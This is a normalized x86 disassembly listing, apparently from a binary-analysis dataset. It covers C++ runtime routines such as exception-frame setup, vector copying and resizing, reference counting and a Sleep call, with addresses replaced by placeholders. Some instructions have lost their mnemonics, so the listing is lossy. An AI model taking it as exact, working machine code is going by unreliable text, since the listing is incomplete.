mov ebx [ ebp - 0x10 ]
sub_10003fa0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn
push 0xffffffff
push 0x0
push esi
mov ecx edi
call sub_100019e0
add esi 0x1c
add edi 0x1c
cmp esi ebx
jne r-xdata
sub_10003fd0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp + 0x10 ]
pop ebp
retn
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
lea edi [ eax + 0x14 ]
xor ebx ebx
add edi 0x1c
lea eax [ edi - 0x14 ]
add esi 0x1c
cmp eax [ ebp + 0xc ]
jne r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
lea eax [ edi - 0x14 ]
cmp esi eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] dx
cmp [ edi ] 0x8
jae r-xdata
mov ecx [ esi ]
push ecx
call sub_10019ce4
add esp 0x4
mov eax [ edi - 0x14 ]
mov [ esi ] eax
mov [ edi - 0x14 ] ebx
mov eax [ edi - 0x4 ]
lea ecx [ eax + eax + 0x2 ]
push ecx
lea edx [ edi - 0x14 ]
push edx
push esi
call sub_1001a060
add esp 0xc
jmp r-xdata
mov ecx [ edi - 0x4 ]
mov [ esi + 0x10 ] ecx
mov edx [ edi ]
mov [ esi + 0x14 ] edx
mov [ edi - 0x4 ] ebx
mov [ edi ] ebx
sub_10004060
push ebp
mov ebp esp
push 0xffffffff
push sub_1002bf61
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
lea esp [ esp ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
add esi 0x1c
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x10 ] esi
add edi 0x1c
jmp r-xdata
push 0xffffffff
push ebx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
push edi
mov ecx esi
mov [ esi ] ax
call sub_100019e0
cmp edi [ ebp + 0xc ]
je r-xdata
sub_100040d8
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x10 ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_1001a898
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x14 ]
push esi
push ebx
call sub_100023b0
add esi 0x1c
add esp 0x8
cmp esi edi
jne r-xdata
sub_10004120
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
cmp ecx esi
je r-xdata
pop esi
pop ebp
retn
push ebx
add ecx 0x8
add eax 0x8
cmp ecx esi
jne r-xdata
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
cmp eax ecx
je r-xdata
test eax eax
je r-xdata
pop ebx
mov ebx [ ecx + 0x4 ]
mov edx [ eax + 0x4 ]
mov [ eax + 0x4 ] ebx
mov [ ecx + 0x4 ] edx
mov ebx [ ecx ]
mov edx [ eax ]
mov [ eax ] ebx
mov [ ecx ] edx
sub_10004170
push ebp
mov ebp esp
push 0xffffffff
push sub_1002bfb1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov esi [ edi + 0x28 ]
sub esi [ edi + 0x24 ]
push 0x1
sar esi 0x2
lea eax [ esi + esi * 2 ]
push eax
mov [ ebp - 0x18 ] eax
call sub_1001a8ef
add esp 0x8
mov [ ebp - 0x14 ] eax
test eax eax
jne r-xdata
mov ebx eax
mov [ ebp - 0xd ] 0x0
test esi esi
je r-xdata
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call sub_1001a818
mov esi eax
add esp 0x4
mov [ ebp - 0x1c ] esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp esi ebx
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
mov edx [ edi ]
mov eax [ edx + 0xc ]
movzx ebx [ rw-data ]
mov ecx edi
call eax
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
movzx eax ax
mov [ esi + 0x7 ] bl
mov [ esi + 0x4 ] ax
mov [ esi + 0x6 ] 0x2
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edx
mov [ esi ] 0x0
xor ebx ebx
jmp r-xdata
mov ecx [ edi + 0x24 ]
mov ecx [ ecx + eax * 4 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
test eax eax
je r-xdata
sub esp 0x8
mov eax esp
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov ebx [ ebp - 0x20 ]
mov [ ebp - 0x1c ] esp
mov [ ebp - 0x18 ] eax
test ebx ebx
je r-xdata
mov edx [ eax ]
mov eax [ ebp - 0x24 ]
mov [ eax ] edx
push esi
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
call sub_10003170
mov eax [ edi + 0x38 ]
mov [ ebp - 0x4 ] 0x1
cmp eax [ edi + 0x3c ]
je r-xdata
mov al [ ebp - 0xd ]
inc al
mov [ ebp - 0xd ] al
movzx eax al
cmp eax esi
jb r-xdata
mov ecx [ ebp - 0x14 ]
add ecx [ ebp - 0x18 ]
cmp ebx ecx
jae r-xdata
mov ecx edi
call sub_10003c10
push 0x8
call sub_1001a818
add esp 0x4
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0x2
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
lea esi [ ebx + 0x4 ]
test edx edx
je r-xdata
mov ax [ eax ]
mov cl [ rw-data ]
mov [ ebx ] ax
mov [ ebx + 0x2 ] cl
add ebx 0x3
xor eax eax
mov ecx eax
call sub_10016430
jmp r-xdata
mov ebx [ ebp - 0x20 ]
lea ecx [ edx + 0x1 ]
mov ebx esi
mov eax edx
[ ebx ] ecx
cmp eax edx
je r-xdata
xor esi esi
movzx edx [ ebp - 0xe ]
mov eax [ edi ]
movzx ebx [ rw-data ]
mov [ ebp - 0x14 ] edx
mov edx [ eax + 0xc ]
mov ecx edi
call edx
mov ecx [ ebp - 0x14 ]
movzx eax ax
mov [ esi + 0x4 ] ax
mov eax [ ebp - 0x18 ]
mov [ esi + 0x7 ] bl
mov ebx [ ebp - 0x20 ]
mov [ esi + 0x6 ] 0x2
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] ecx
mov [ esi ] 0x0
jmp r-xdata
lea ecx [ ebp - 0xe ]
push ecx
mov ecx eax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0xe ] 0x0
call sub_100173b0
push 0x10
mov [ ebp - 0x18 ] eax
call sub_1001a818
mov esi eax
add esp 0x4
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0x3
test esi esi
je r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x18 ]
push edx
push eax
call sub_100030d0
mov edx [ esi ]
test edx edx
jne r-xdata
mov esi [ ebp - 0x28 ]
sub esp 0x8
mov eax esp
mov [ ebp - 0x1c ] esp
mov [ ebp - 0x18 ] eax
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
test esi esi
je r-xdata
mov ecx [ edx ]
mov edx [ ebp - 0x2c ]
mov [ edx ] ecx
xor eax eax
push esi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
call sub_10003170
mov edx [ edi + 0x38 ]
mov [ ebp - 0x4 ] 0x4
cmp edx [ edi + 0x3c ]
je r-xdata
jmp r-xdata
mov ecx edi
call sub_10003c10
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
mov edx [ esi + 0x4 ]
test edx edx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
test ebx ebx
je r-xdata
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov esi [ ebp - 0x28 ]
lea ecx [ edx + 0x1 ]
lea ebx [ esi + 0x4 ]
mov eax edx
[ ebx ] ecx
cmp eax edx
je r-xdata
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebx + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov esi [ ebp - 0x28 ]
mov edx [ ebp - 0x2c ]
mov ecx [ ebp - 0x18 ]
push esi
push edx
call sub_100030d0
jmp r-xdata
mov edx [ esi + 0x4 ]
test edx edx
jne r-xdata
mov edx [ ebx ]
mov eax [ edx ]
mov ecx ebx
call eax
lea ecx [ ebx + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov ebx [ ebp - 0x20 ]
mov eax [ ebx ]
mov edx [ eax + 0x4 ]
mov ecx ebx
call edx
sub_10004480
push ebp
mov ebp esp
push 0xffffffff
push sub_1002bfe0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x18 ] edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
call sub_10004170
lea ebx [ ebx ]
mov ecx [ edi + 0xc ]
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] ebx
call sub_10001660
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x2
cmp eax ebx
je r-xdata
mov ecx [ eax + ecx * 4 ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
call edx
push eax
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
call sub_10003170
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
je r-xdata
mov esi [ ebp - 0x28 ]
jmp r-xdata
cmp [ eax ] ebx
jne r-xdata
mov esi [ ebp - 0x20 ]
jmp r-xdata
mov ecx 0xffff
cmp [ eax + 0x4 ] cx
je r-xdata
push 0x64
call [ Sleep@IAT ]
mov [ ebp - 0x4 ] 0x0
cmp esi ebx
je r-xdata
mov esi [ ebp - 0x28 ]
sub esp 0x8
mov edi esp
mov [ ebp - 0x1c ] esp
mov [ edi ] ebx
mov [ edi + 0x4 ] ebx
mov ebx esi
mov [ ebp - 0x1c ] eax
test esi esi
je r-xdata
cmp [ eax + 0x4 ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0x0
cmp esi ebx
je r-xdata
mov esi [ ebp - 0x20 ]
sub esp 0x8
mov edi esp
mov [ ebp - 0x1c ] esp
mov [ edi ] ebx
mov [ edi + 0x4 ] ebx
mov ebx esi
mov [ ebp - 0x1c ] eax
test esi esi
je r-xdata
mov [ ebp - 0x11 ] 0x1
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ecx [ ebp - 0x18 ]
call sub_10003640
mov edi [ ebp - 0x18 ]
xor ebx ebx
mov ecx [ ebx + 0x4 ]
test ecx ecx
je r-xdata
inc [ ebp - 0x11 ]
jmp r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ecx [ ebp - 0x18 ]
call sub_10003c10
mov edi [ ebp - 0x18 ]
xor ebx ebx
mov ecx [ ebx + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov esi [ ebp - 0x28 ]
lea edx [ ecx + 0x1 ]
lea esi [ ebx + 0x4 ]
mov eax ecx
[ esi ] edx
cmp eax ecx
jne r-xdata
mov eax [ edi + 0x24 ]
mov edx [ edi + 0x28 ]
movzx ecx [ ebp - 0x11 ]
sub edx eax
sar edx 0x2
cmp ecx edx
jae r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov esi [ ebp - 0x20 ]
lea edx [ ecx + 0x1 ]
lea esi [ ebx + 0x4 ]
mov eax ecx
[ esi ] edx
cmp eax ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
mov [ edi + 0x4 ] ebx
mov [ edi ] eax
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ ebp - 0x1c ]
mov [ edi + 0x4 ] ebx
mov [ edi ] eax
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_100046f0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c011
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
lea esp [ esp ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
add esi 0x1c
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x10 ] esi
add edi 0x1c
jmp r-xdata
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
push edi
mov ecx esi
mov [ esi ] ax
call sub_10003860
cmp edi [ ebp + 0xc ]
je r-xdata
sub_10004765
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x10 ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_1001a898
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x14 ]
push esi
push ebx
call sub_100023b0
add esi 0x1c
add esp 0x8
cmp esi edi
jne r-xdata
sub_100047a0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
add ecx 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
push edx
push eax
call sub_10004060
add esp 0x14
pop ebp
retn 0xc
sub_100047d0
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push ecx
mov ecx [ esi + 0x4 ]
lea edx [ esi + 0xc ]
push edx
push ecx
push eax
call sub_10003bb0
mov edx [ esi ]
push edx
call sub_10019ce4
add esp 0x14
sub_10004820
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c030
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov eax [ ebp + 0x8 ]
cmp eax 0x1fffffff
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
sar ecx 0x3
cmp ecx eax
jae r-xdata
push r--data
call sub_100190f4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edi [ esi + 0xc ]
push eax
mov ecx edi
call sub_10003070
mov edx [ ebp + 0x8 ]
mov ecx [ esi ]
push edx
push 0x0
mov ebx eax
mov eax [ esi + 0x4 ]
push edi
push ebx
push eax
push ecx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0x0
call sub_10004120
mov ecx [ esi + 0x4 ]
mov eax [ esi ]
mov edi ecx
sub edi eax
add esp 0x18
sar edi 0x3
mov [ ebp - 0x4 ] 0xffffffff
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
lea edx [ ebx + ecx * 8 ]
lea eax [ ebx + edi * 8 ]
mov [ esi + 0x8 ] edx
mov [ esi + 0x4 ] eax
mov [ esi ] ebx
mov edx [ ebp + 0x8 ]
push edx
lea edx [ esi + 0xc ]
push edx
push ecx
push eax
call sub_10003bb0
mov eax [ esi ]
push eax
call sub_10019ce4
add esp 0x14
sub_10004910
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
mov ecx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x1c ]
mov [ edi ] eax
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
xor bl bl
add eax edx
je r-xdata
mov eax [ edi ]
push 0x1
push eax
call sub_1001a8ef
mov ebx eax
add esp 0x8
mov [ ebp - 0x4 ] ebx
test ebx ebx
jne r-xdata
xor ecx ecx
mov dx [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ eax + ebx ] dx
mov cl [ ebp + 0xa ]
mov edx [ rw-data ]
mov [ edx + ebx ] cl
mov al [ ebp + 0xb ]
mov ecx [ rw-data ]
mov esi [ rw-data ]
mov [ ecx + ebx ] al
mov edi [ ebp + 0x10 ]
mov ecx edi
sub ecx [ ebp + 0xc ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add esi ebx
add eax edx
mov [ ebp + 0x1f ] 0x0
je r-xdata
mov [ edi ] eax
test esi esi
je r-xdata
lea edx [ ecx * 8 ]
sub edx ecx
mov ecx [ esi + edx * 4 + 0x10 ]
inc bl
lea edx [ ecx + ecx + 0x3 ]
add [ edi ] edx
movzx ecx bl
cmp ecx eax
jb r-xdata
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
xor ebx ebx
jmp r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov ecx [ ebp + 0x1c ]
mov eax [ ebp + 0x10 ]
push ecx
lea edx [ ebp + 0x18 ]
push edx
push eax
push esi
call sub_100024a0
mov ecx [ ebp + 0xc ]
push ecx
call sub_10019ce4
add esp 0x14
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x18
cmp esi edi
je r-xdata
mov cl [ rw-data ]
lea edi [ ebx * 8 ]
sub edi ebx
mov [ esi ] cl
mov edx [ ebp + 0xc ]
add edi edi
add edi edi
mov eax [ edi + edx + 0x10 ]
lea ecx [ edi + edx ]
inc esi
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
push esi
call sub_10019ce4
mov ebx [ ebp - 0x4 ]
add esp 0x4
mov ebx 0x7
lea edx [ eax + eax ]
push edx
push ecx
add eax eax
push eax
push esi
call sub_1001a92f
mov eax [ ebp + 0xc ]
mov ecx [ edi + eax + 0x10 ]
mov edi [ ebp + 0x10 ]
lea esi [ esi + ecx * 2 + 0x2 ]
mov cl [ ebp + 0x1f ]
inc cl
movzx ebx cl
mov [ ebp + 0x1f ] cl
mov ecx edi
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
add esp 0x10
cmp ebx eax
jb r-xdata
mov ecx [ ecx ]
xor edx edx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] 0x0
mov [ esi ] dx
add esi 0x1c
cmp esi edi
jne r-xdata
mov ecx [ esi ]
push ecx
call sub_10019ce4
add esp 0x4
mov ebx [ ebp - 0x4 ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov esi [ ebp + 0xc ]
sub_10004ad0
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
cmp ecx eax
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
push edi
push edx
push ecx
push eax
push eax
call sub_10003fd0
mov edx [ esi + 0x4 ]
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
lea ecx [ esi + 0xc ]
push ecx
push edx
push edi
call sub_100024a0
add esp 0x20
mov [ esi + 0x4 ] edi
pop edi
sub_10004b10
push ebp
mov ebp esp
mov eax [ ecx + 0x4 ]
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ecx ]
push edi
sub eax esi
mov edi 0x1fffffff
sar eax 0x3
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
mov edx [ ecx + 0x8 ]
sub edx esi
sar edx 0x3
cmp eax edx
jbe r-xdata
push r--data
call sub_100190f4
pop edi
pop esi
pop ebp
retn 0x4
mov esi edx
shr esi 0x1
mov edi 0x1fffffff
sub edi esi
cmp edi edx
jae r-xdata
add edx esi
xor edx edx
jmp r-xdata
push edx
call sub_10004820
mov edx eax
cmp edx eax
jae r-xdata
sub_10004b70
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c050
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x9249249
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax ebx
jae r-xdata
push r--data
call sub_100190f4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edi [ esi + 0xc ]
push ebx
mov ecx edi
call sub_10001270
mov ebx [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
push ebx
push 0x0
push edi
push eax
push ecx
push edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x0
call sub_100046f0
mov ebx [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov edi edx
shr edi 0x1f
add esp 0x18
add edi edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax * 8 ]
sub ecx eax
mov eax [ ebp - 0x14 ]
lea edx [ eax + ecx * 4 ]
lea ecx [ edi * 8 ]
sub ecx edi
mov [ esi + 0x8 ] edx
lea edx [ eax + ecx * 4 ]
mov [ esi + 0x4 ] edx
mov [ esi ] eax
mov ecx [ ebp + 0x8 ]
push ecx
lea eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x4 ]
push eax
push ebx
call sub_100024a0
mov edx [ esi ]
push edx
call sub_10019ce4
add esp 0x14
sub_10004c90
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c083
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov cx [ ebp + 0x8 ]
lea eax [ ebp - 0x14 ]
push eax
sub esp 0x14
mov eax esp
mov [ eax ] cx
mov edx [ ebp + 0x8 ]
shr edx 0x10
mov [ eax + 0x2 ] dl
mov ecx [ ebp + 0x8 ]
shr ecx 0x18
lea edx [ ebp + 0xc ]
xor esi esi
mov [ ebp - 0x18 ] esp
mov [ eax + 0x3 ] cl
push edx
lea ecx [ eax + 0x4 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x14 ] esi
call sub_100025c0
mov ecx edi
call sub_10004910
push 0x10
mov ebx eax
call sub_1001a818
add esp 0x4
cmp eax esi
je r-xdata
mov [ ebp - 0x14 ] esi
movzx ecx [ rw-data ]
xor edx edx
mov [ eax + 0x7 ] cl
mov ecx [ ebp - 0x14 ]
mov [ eax + 0x4 ] dx
mov [ eax + 0x6 ] dl
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] ecx
mov [ eax ] esi
mov [ ebp - 0x14 ] eax
jmp r-xdata
push 0xc
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0x0
call sub_10012790
push 0xc
push rw-data
mov ecx esi
call sub_10012770
movzx eax [ ebp + 0x8 ]
push eax
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x18 ] esp
push ecx
mov ecx esi
call sub_10012c50
mov ecx [ edi + 0x1c ]
mov edx [ ecx ]
mov eax [ edx + 0xc ]
push ebx
call eax
mov [ ebp - 0xd ] al
test esi esi
je r-xdata
mov ecx eax
call sub_10012700
mov esi eax
mov ecx [ edi + 0x10 ]
mov edx [ ecx ]
mov eax [ ebp - 0x14 ]
mov edx [ edx + 0x4 ]
push eax
call edx
push 0x18
mov ebx eax
call sub_1001a818
add esp 0x4
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x1
cmp eax esi
je r-xdata
mov esi [ ebp - 0x14 ]
test esi esi
je r-xdata
mov ecx esi
call sub_10012740
push esi
call sub_10019ce4
add esp 0x4
test ebx ebx
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
push esi
call sub_10019ce4
add esp 0x4
push eax
call sub_1001a3eb
add esp 0x4
mov al [ ebp - 0xd ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov ecx [ ebp + 0x18 ]
push ecx
mov ecx [ ebp + 0x10 ]
lea edx [ ebp + 0x18 ]
push edx
push ecx
push eax
call sub_100024a0
mov edx [ ebp + 0xc ]
push edx
call sub_10019ce4
add esp 0x14
push ebx
call sub_10019ce4
add esp 0x4
push eax
call sub_1001a3eb
add esp 0x4
sub_10004e30
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ edi + 0x4 ]
sub ecx [ edi ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp + 0x8 ] eax
jne r-xdata
mov ecx [ esi + 0x4 ]
push ebx
mov ebx [ esi ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp [ ebp + 0x8 ] ecx
ja r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
cmp ecx eax
je r-xdata
mov edx [ esi + 0x8 ]
sub edx ebx
mov [ ebp - 0x4 ] edx
mov eax 0x92492493
imul edx
add edx [ ebp - 0x4 ]
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov eax [ edi + 0x4 ]
push ebx
push eax
mov eax [ edi ]
push eax
call sub_10003fa0
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ esi + 0x4 ]
lea edx [ esi + 0xc ]
